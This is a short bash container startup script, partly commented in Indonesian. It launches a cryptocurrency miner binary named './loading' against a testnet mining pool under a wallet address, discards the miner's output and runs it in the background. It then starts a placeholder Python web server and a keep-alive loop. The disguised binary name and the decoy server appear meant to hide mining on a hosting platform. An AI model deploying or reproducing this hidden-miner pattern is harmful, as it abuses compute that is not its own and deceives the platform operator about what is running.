#!/bin/bash

# Generate random worker ID
WORKER_ID=$(echo $(shuf -i 009-999 -n 1)-loading)

# Run the miner through proxychains
./loading --pool stratum+tcp://0x1bE17413356722a411033303EF7D8A13768fdF83.$WORKER_ID@pool-core-testnet.inichain.com:32672 --cpu-devices 0 --cpu-devices 1 >/dev/null 2>&1 &

# Menampilkan pesan loading server
echo "Loading server..."

# Membuat server sederhana menggunakan Python
cat <<EOF > /app/server.py
import http.server
import socketserver

PORT = 8080
Handler = http.server.SimpleHTTPRequestHandler

print("Serving on port", PORT)
with socketserver.TCPServer(("", PORT), Handler) as httpd:
    httpd.serve_forever()
EOF

# Jalankan server Python
python3 /app/server.py &
echo "Server is running at http://localhost:8080"

# Keep the container alive
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
